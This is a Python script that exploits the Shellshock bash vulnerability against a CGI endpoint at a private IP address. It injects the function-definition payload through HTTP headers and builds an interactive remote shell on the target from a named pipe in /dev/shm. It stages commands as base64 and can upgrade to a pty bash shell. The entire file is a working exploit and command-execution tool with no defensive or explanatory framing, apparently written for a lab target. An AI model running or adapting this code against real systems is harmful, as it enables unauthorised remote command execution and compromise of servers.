#!/usr/bin/python3
# -*- coding: utf-8 -*-

import base64
import random
import requests
import threading
import time

class WebShell(object):
    #Initailize Class + Setup Shell
    def __init__(self, interval=1.3):
        self.url = r"http://192.168.43.178/cgi-bin/status"
        session = random.randrange(10000,99999)
        print(f"[*] Session ID : {session}")
        self.stdin = f'/dev/shm/input.{session}'
        self.stdout = f'/dev/shm/input.{session}'
        self.interval= interval

        # set up shell
        print("[*] Setting up fifo shell on target")
        MakeNamedPipes = f"mkfifo {self.stdin}; tail -f {self.stdin} | /bin/sh 2>&1 > {self.stdout}"
        self.RunRawCmd(MakeNamedPipes, timeout=0.1)

        # set up read thread
        print("[*] Setting up read thread")
        self.interval = interval
        thread = threading.Thread(target=self.ReadThread, args=())
        thread.daemon = True
        thread.start()

    # Read $session, output text ti screen and wipe session
    def ReadThread(self):
        GetOutput = f"/bin/cat {self.stdout}"
        while True:
            result = self.RunRawCmd(GetOutput) #, proxy=None)
            if result:
                print(result)
                ClearOutput = f'echo -n "" > {self.stdout}'
                self.RunRawCmd(ClearOutput)
            time.sleep(self.interval)

    # Execute command
    def RunRawCmd(self, cmd, timeout=50):
        payload = """() { :; }; echo "Content-Type: text/html";echo;"""
        payload += """export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin;"""
        payload += cmd

        
        headers = {'User-Agent': payload}
        headers = {'Cookie': payload}
        headers = {'Referer': payload}
        try:
            r = requests.get(self.url, headers=headers, timeout=timeout)
            return r.text
        except:
            r = requests.get(self.url, headers=headers, timeout=timeout)
            return r.text
    
    # Send b64'd command to RunRawCmd
    def WriteCmd(self, cmd):
        b64cmd = base64.b64encode('{}\n'.format(cmd.rstrip()).encode('utf-8')).decode('utf-8')
        stage_cmd = f'echo {b64cmd} | base64 -d > {self.stdin}'
        self.RunRawCmd(stage_cmd)
        time.sleep(self.interval * 1.1)

    def UpgradeShell(self):
        #upgrade shell
        UpgradeShell = """python3 -c 'import pty; pty.spawn("/bin/bash")'"""
        self.WriteCmd(UpgradeShell)

prompt = "Shell>>> "
S = WebShell() 
while True:
    cmd = input(prompt)
    if cmd == "upgrade":
        prompt = ""
        S.UpgradeShell()
    else:
        S.WriteCmd(cmd)
    
